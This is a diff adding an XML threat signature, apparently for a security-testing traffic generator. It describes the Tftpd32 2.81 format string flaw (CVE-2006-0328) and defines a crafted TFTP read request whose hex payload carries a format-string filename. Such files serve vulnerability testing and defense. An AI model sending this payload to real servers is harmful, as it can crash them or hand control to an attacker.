@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Tftpd32 SEND / GET Remote Format String Vulnerability"/>
+    <EngDesc display="true" value="This threat exploits a remote format string vulnerability in Tftpd32 that can be triggered when the server uses the filename passed in TFTP requests to construct an error message. With a specially crafted filename, an attacker can cause arbitrary code execution, resulting in a loss of integrity. TFTPd is a internet application that usually listens on udp port 69"/>
+    <Intent display="true">
+      <item value="Command_Injection"/>
+      <item value="Unauthorized_Access"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="TFTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="TFTPD32"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="TFTPD32_TFTPD32"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="TFTPD32_TFTPD32_2.81"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.critical.lt/research/tftpd32_281_dos.txt"/>
+    <CVEID display="true" value="CVE-2006-0328 "/>
+    <bugtraqID display="true" value="16333"/>
+    <OSVDB display="true" value="22661"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID value="0000010bb1d40a3700c000a80001003c0ca39fcc" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="integrity"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632852697253220000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1149739732" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="TFTPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1026,65535)" destPort="$TFTPdestPort" checksum="" length="" Payload="0001252E3130303078006F637465740000FF"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
